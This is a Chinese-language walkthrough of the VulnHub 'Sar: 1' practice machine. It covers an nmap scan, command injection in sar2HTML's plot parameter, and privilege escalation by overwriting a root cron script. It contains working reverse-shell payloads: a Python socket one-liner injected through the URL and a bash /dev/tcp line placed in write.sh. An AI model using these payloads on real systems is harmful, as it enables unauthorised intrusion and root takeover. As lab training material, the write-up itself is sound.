[https://www.vulnhub.com/entry/sar-1,425/](https://www.vulnhub.com/entry/sar-1,425/)  
参考资料  
[https://infosecwriteups.com/vulnhub-sar-1-walkthrough-oscp-prep-by-dollarboysushil-c0e0b9778fdf](https://infosecwriteups.com/vulnhub-sar-1-walkthrough-oscp-prep-by-dollarboysushil-c0e0b9778fdf)  
信息探测  
┌──(kali㉿kali)-[~]  
└─$ sudo nmap -sS -sV -p- -A -Pn 192.168.163.149  
Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org) ) at 2025-07-05 11:23 EDT  
Nmap scan report for 192.168.163.149  
Host is up (0.00050s latency).  
Not shown: 65534 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))  
|_http-title: Apache2 Ubuntu Default Page: It works  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
MAC Address: 00:0C:29:BB:26:C0 (VMware)  
Device type: general purpose  
Running: Linux 4.X|5.X  
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5  
OS details: Linux 4.15 - 5.8  
Network Distance: 1 hop
 
TRACEROUTE  
HOP RTT ADDRESS  
1 0.50 ms 192.168.163.149
 
OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds   ┌──(kali㉿k
 
web网页  
[http://192.168.163.149/robots.txt](http://192.168.163.149/robots.txt)
 
链接  
sar2HTML  
[http://192.168.163.149/sar2HTML](http://192.168.163.149/sar2HTML)
 
[http://192.168.163.149/sar2HTML/index.php?plot=;id](http://192.168.163.149/sar2HTML/index.php?plot=;id)
    
直接exp  
[http://192.168.163.149/sar2HTML/index.php?plot=;python3](http://192.168.163.149/sar2HTML/index.php?plot=;python3) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.163.128",1010));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
   
![[Sar 1 image b43d616740cb9151.png|Exported image]]  

找到user.txt

![[Sar 1 image 8665429fd056f5ed.png|Exported image]]   
提权检测脚本  
检测脚本地址 [https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
   

[https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh)
   

提权脚本  
[CVE-2021-4034] PwnKit 提权没有成功 没有make 谨记少在目标上安装软件 安全软件就会留下痕迹
    
靶机有时需要重启
   

cd /var/www/html 没有执行权限  
www-data@sar:/var/www/html$ ls -al  
ls -al  
total 40  
drwxr-xr-x 3 www-data www-data 4096 Oct 21 2019 .  
drwxr-xr-x 5 www-data www-data 4096 Jul 5 21:07 ..  
-rwxr-xr-x 1 root root 22 Oct 20 2019 finally.sh  
-rw-r--r-- 1 www-data www-data 10918 Oct 20 2019 index.html  
-rw-r--r-- 1 www-data www-data 21 Oct 20 2019 phpinfo.php  
-rw-r--r-- 1 root root 9 Oct 21 2019 robots.txt  
drwxr-xr-x 4 www-data www-data 4096 Oct 20 2019 sar2HTML  
-rwxrwxrwx 1 www-data www-data 30 Oct 21 2019 write.sh  
www-data@sar:/var/www/html$
 
≫ cat write.sh  
#!/bin/bash  
bash -i \>& /dev/tcp/192.168.1.65/9999 0\>&1
 
本机创建write脚本 使用wget 重新下载 授权 777 执行

![[Sar 1 image a8804eded08efef0.png|Exported image]]  

难点在crontab的 延时给shell权限 要是没有等待就是没有root权限  
需要等待5分钟才能拿到root权限

![[Sar 1 image bab45e3f308dbc6c.png|Exported image]]  
![[Sar 1 image f10199c49212b3e0.png|Exported image]]   
一瞬间拿到shell
 ![[Sar 1 image 01f59907670c4d69.png|Exported image]]